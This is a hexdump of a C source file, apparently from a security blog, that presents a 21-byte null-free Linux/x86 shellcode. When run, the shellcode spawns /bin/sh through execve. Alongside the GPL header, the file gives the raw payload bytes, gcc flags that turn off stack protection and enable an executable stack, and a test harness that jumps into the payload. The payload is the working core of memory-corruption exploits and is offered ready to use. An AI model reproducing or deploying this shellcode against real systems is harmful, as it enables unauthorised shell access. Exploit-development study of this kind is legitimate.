00000000  2f 2a 0a 0a 20 54 69 6e  79 20 45 78 65 63 76 65  |/*.. Tiny Execve|
00000010  20 73 68 20 53 68 65 6c  6c 63 6f 64 65 20 2d 20  | sh Shellcode - |
00000020  43 20 4c 61 6e 67 75 61  67 65 20 2d 20 4c 69 6e  |C Language - Lin|
00000030  75 78 2f 78 38 36 0a 20  43 6f 70 79 72 69 67 68  |ux/x86. Copyrigh|
00000040  74 20 28 43 29 20 32 30  31 33 20 47 65 79 73 6c  |t (C) 2013 Geysl|
00000050  61 6e 20 47 2e 20 42 65  6d 2c 20 48 61 63 6b 69  |an G. Bem, Hacki|
00000060  6e 67 20 62 69 74 73 0a  0a 20 20 20 68 74 74 70  |ng bits..   http|
00000070  3a 2f 2f 68 61 63 6b 69  6e 67 62 69 74 73 2e 63  |://hackingbits.c|
00000080  6f 6d 0a 20 20 20 67 65  79 73 6c 61 6e 40 67 6d  |om.   geyslan@gm|
00000090  61 69 6c 2e 63 6f 6d 0a  0a 20 54 68 69 73 20 70  |ail.com.. This p|
000000a0  72 6f 67 72 61 6d 20 69  73 20 66 72 65 65 20 73  |rogram is free s|
000000b0  6f 66 74 77 61 72 65 3a  20 79 6f 75 20 63 61 6e  |oftware: you can|
000000c0  20 72 65 64 69 73 74 72  69 62 75 74 65 20 69 74  | redistribute it|
000000d0  20 61 6e 64 2f 6f 72 20  6d 6f 64 69 66 79 0a 20  | and/or modify. |
000000e0  69 74 20 75 6e 64 65 72  20 74 68 65 20 74 65 72  |it under the ter|
000000f0  6d 73 20 6f 66 20 74 68  65 20 47 4e 55 20 47 65  |ms of the GNU Ge|
00000100  6e 65 72 61 6c 20 50 75  62 6c 69 63 20 4c 69 63  |neral Public Lic|
00000110  65 6e 73 65 20 61 73 20  70 75 62 6c 69 73 68 65  |ense as publishe|
00000120  64 20 62 79 0a 20 74 68  65 20 46 72 65 65 20 53  |d by. the Free S|
00000130  6f 66 74 77 61 72 65 20  46 6f 75 6e 64 61 74 69  |oftware Foundati|
00000140  6f 6e 2c 20 65 69 74 68  65 72 20 76 65 72 73 69  |on, either versi|
00000150  6f 6e 20 33 20 6f 66 20  74 68 65 20 4c 69 63 65  |on 3 of the Lice|
00000160  6e 73 65 2c 20 6f 72 0a  20 28 61 74 20 79 6f 75  |nse, or. (at you|
00000170  72 20 6f 70 74 69 6f 6e  29 20 61 6e 79 20 6c 61  |r option) any la|
00000180  74 65 72 20 76 65 72 73  69 6f 6e 2e 0a 0a 20 54  |ter version... T|
00000190  68 69 73 20 70 72 6f 67  72 61 6d 20 69 73 20 64  |his program is d|
000001a0  69 73 74 72 69 62 75 74  65 64 20 69 6e 20 74 68  |istributed in th|
000001b0  65 20 68 6f 70 65 20 74  68 61 74 20 69 74 20 77  |e hope that it w|
000001c0  69 6c 6c 20 62 65 20 75  73 65 66 75 6c 2c 0a 20  |ill be useful,. |
000001d0  62 75 74 20 57 49 54 48  4f 55 54 20 41 4e 59 20  |but WITHOUT ANY |
000001e0  57 41 52 52 41 4e 54 59  3b 20 77 69 74 68 6f 75  |WARRANTY; withou|
000001f0  74 20 65 76 65 6e 20 74  68 65 20 69 6d 70 6c 69  |t even the impli|
00000200  65 64 20 77 61 72 72 61  6e 74 79 20 6f 66 0a 20  |ed warranty of. |
00000210  4d 45 52 43 48 41 4e 54  41 42 49 4c 49 54 59 20  |MERCHANTABILITY |
00000220  6f 72 20 46 49 54 4e 45  53 53 20 46 4f 52 20 41  |or FITNESS FOR A|
00000230  20 50 41 52 54 49 43 55  4c 41 52 20 50 55 52 50  | PARTICULAR PURP|
00000240  4f 53 45 2e 20 20 53 65  65 20 74 68 65 0a 20 47  |OSE.  See the. G|
00000250  4e 55 20 47 65 6e 65 72  61 6c 20 50 75 62 6c 69  |NU General Publi|
00000260  63 20 4c 69 63 65 6e 73  65 20 66 6f 72 20 6d 6f  |c License for mo|
00000270  72 65 20 64 65 74 61 69  6c 73 2e 0a 0a 20 59 6f  |re details... Yo|
00000280  75 20 73 68 6f 75 6c 64  20 68 61 76 65 20 72 65  |u should have re|
00000290  63 65 69 76 65 64 20 61  20 63 6f 70 79 20 6f 66  |ceived a copy of|
000002a0  20 74 68 65 20 47 4e 55  20 47 65 6e 65 72 61 6c  | the GNU General|
000002b0  20 50 75 62 6c 69 63 20  4c 69 63 65 6e 73 65 0a  | Public License.|
000002c0  20 61 6c 6f 6e 67 20 77  69 74 68 20 74 68 69 73  | along with this|
000002d0  20 70 72 6f 67 72 61 6d  2e 20 20 49 66 20 6e 6f  | program.  If no|
000002e0  74 2c 20 73 65 65 20 3c  68 74 74 70 3a 2f 2f 77  |t, see <http://w|
000002f0  77 77 2e 67 6e 75 2e 6f  72 67 2f 6c 69 63 65 6e  |ww.gnu.org/licen|
00000300  73 65 73 2f 3e 0a 0a 2a  2f 0a 0a 2f 2a 0a 0a 20  |ses/>..*/../*.. |
00000310  20 20 74 69 6e 79 5f 65  78 65 63 76 65 5f 73 68  |  tiny_execve_sh|
00000320  5f 73 68 65 6c 6c 63 6f  64 65 0a 0a 20 20 2a 20  |_shellcode..  * |
00000330  32 31 20 62 79 74 65 73  0a 20 20 2a 20 6e 75 6c  |21 bytes.  * nul|
00000340  6c 2d 66 72 65 65 0a 0a  0a 20 20 20 23 20 67 63  |l-free...   # gc|
00000350  63 20 2d 6d 33 32 20 2d  66 6e 6f 2d 73 74 61 63  |c -m32 -fno-stac|
00000360  6b 2d 70 72 6f 74 65 63  74 6f 72 20 2d 7a 20 65  |k-protector -z e|
00000370  78 65 63 73 74 61 63 6b  20 74 69 6e 79 5f 65 78  |xecstack tiny_ex|
00000380  65 63 76 65 5f 73 68 5f  73 68 65 6c 6c 63 6f 64  |ecve_sh_shellcod|
00000390  65 2e 63 20 2d 6f 20 74  69 6e 79 5f 65 78 65 63  |e.c -o tiny_exec|
000003a0  76 65 5f 73 68 5f 73 68  65 6c 6c 63 6f 64 65 0a  |ve_sh_shellcode.|
000003b0  0a 20 20 20 54 65 73 74  69 6e 67 0a 20 20 20 23  |.   Testing.   #|
000003c0  20 2e 2f 74 69 6e 79 5f  65 78 65 63 76 65 5f 73  | ./tiny_execve_s|
000003d0  68 5f 73 68 65 6c 6c 63  6f 64 65 0a 0a 2a 2f 0a  |h_shellcode..*/.|
000003e0  0a 0a 23 69 6e 63 6c 75  64 65 20 3c 73 74 64 69  |..#include <stdi|
000003f0  6f 2e 68 3e 0a 23 69 6e  63 6c 75 64 65 20 3c 73  |o.h>.#include <s|
00000400  74 72 69 6e 67 2e 68 3e  0a 0a 75 6e 73 69 67 6e  |tring.h>..unsign|
00000410  65 64 20 63 68 61 72 20  73 68 65 6c 6c 63 6f 64  |ed char shellcod|
00000420  65 5b 5d 20 3d 20 5c 0a  0a 22 5c 78 33 31 5c 78  |e[] = \.."\x31\x|
00000430  63 39 5c 78 66 37 5c 78  65 31 5c 78 62 30 5c 78  |c9\xf7\xe1\xb0\x|
00000440  30 62 5c 78 35 31 5c 78  36 38 5c 78 32 66 5c 78  |0b\x51\x68\x2f\x|
00000450  32 66 22 0a 22 5c 78 37  33 5c 78 36 38 5c 78 36  |2f"."\x73\x68\x6|
00000460  38 5c 78 32 66 5c 78 36  32 5c 78 36 39 5c 78 36  |8\x2f\x62\x69\x6|
00000470  65 5c 78 38 39 5c 78 65  33 5c 78 63 64 22 0a 22  |e\x89\xe3\xcd"."|
00000480  5c 78 38 30 22 3b 0a 0a  0a 6d 61 69 6e 20 28 29  |\x80";...main ()|
00000490  0a 7b 0a 0a 20 20 20 20  20 20 20 20 2f 2f 20 57  |.{..        // W|
000004a0  68 65 6e 20 63 6f 6e 74  61 69 6e 73 20 6e 75 6c  |hen contains nul|
000004b0  6c 20 62 79 74 65 73 2c  20 70 72 69 6e 74 66 20  |l bytes, printf |
000004c0  77 69 6c 6c 20 73 68 6f  77 20 61 20 77 72 6f 6e  |will show a wron|
000004d0  67 20 73 68 65 6c 6c 63  6f 64 65 20 6c 65 6e 67  |g shellcode leng|
000004e0  74 68 2e 0a 0a 09 70 72  69 6e 74 66 28 22 53 68  |th....printf("Sh|
000004f0  65 6c 6c 63 6f 64 65 20  4c 65 6e 67 74 68 3a 20  |ellcode Length: |
00000500  20 25 64 5c 6e 22 2c 20  73 74 72 6c 65 6e 28 73  | %d\n", strlen(s|
00000510  68 65 6c 6c 63 6f 64 65  29 29 3b 0a 0a 09 2f 2f  |hellcode));...//|
00000520  20 50 6f 6c 6c 75 74 65  73 20 61 6c 6c 20 72 65  | Pollutes all re|
00000530  67 69 73 74 65 72 73 20  65 6e 73 75 72 69 6e 67  |gisters ensuring|
00000540  20 74 68 61 74 20 74 68  65 20 73 68 65 6c 6c 63  | that the shellc|
00000550  6f 64 65 20 72 75 6e 73  20 69 6e 20 61 6e 79 20  |ode runs in any |
00000560  63 69 72 63 75 6d 73 74  61 6e 63 65 2e 0a 0a 09  |circumstance....|
00000570  5f 5f 61 73 6d 5f 5f 20  28 22 6d 6f 76 6c 20 24  |__asm__ ("movl $|
00000580  30 78 66 66 66 66 66 66  66 66 2c 20 25 65 61 78  |0xffffffff, %eax|
00000590  5c 6e 5c 74 22 0a 09 09  20 22 6d 6f 76 6c 20 25  |\n\t"... "movl %|
000005a0  65 61 78 2c 20 25 65 62  78 5c 6e 5c 74 22 0a 09  |eax, %ebx\n\t"..|
000005b0  09 20 22 6d 6f 76 6c 20  25 65 61 78 2c 20 25 65  |. "movl %eax, %e|
000005c0  63 78 5c 6e 5c 74 22 0a  09 09 20 22 6d 6f 76 6c  |cx\n\t"... "movl|
000005d0  20 25 65 61 78 2c 20 25  65 64 78 5c 6e 5c 74 22  | %eax, %edx\n\t"|
000005e0  0a 09 09 20 22 6d 6f 76  6c 20 25 65 61 78 2c 20  |... "movl %eax, |
000005f0  25 65 73 69 5c 6e 5c 74  22 0a 09 09 20 22 6d 6f  |%esi\n\t"... "mo|
00000600  76 6c 20 25 65 61 78 2c  20 25 65 64 69 5c 6e 5c  |vl %eax, %edi\n\|
00000610  74 22 0a 09 09 20 22 6d  6f 76 6c 20 25 65 61 78  |t"... "movl %eax|
00000620  2c 20 25 65 62 70 5c 6e  5c 74 22 0a 0a 09 09 20  |, %ebp\n\t".... |
00000630  2f 2f 20 43 61 6c 6c 69  6e 67 20 74 68 65 20 73  |// Calling the s|
00000640  68 65 6c 6c 63 6f 64 65  0a 09 09 20 22 63 61 6c  |hellcode... "cal|
00000650  6c 20 73 68 65 6c 6c 63  6f 64 65 22 29 3b 0a 0a  |l shellcode");..|
00000660  7d                                                |}|
00000661
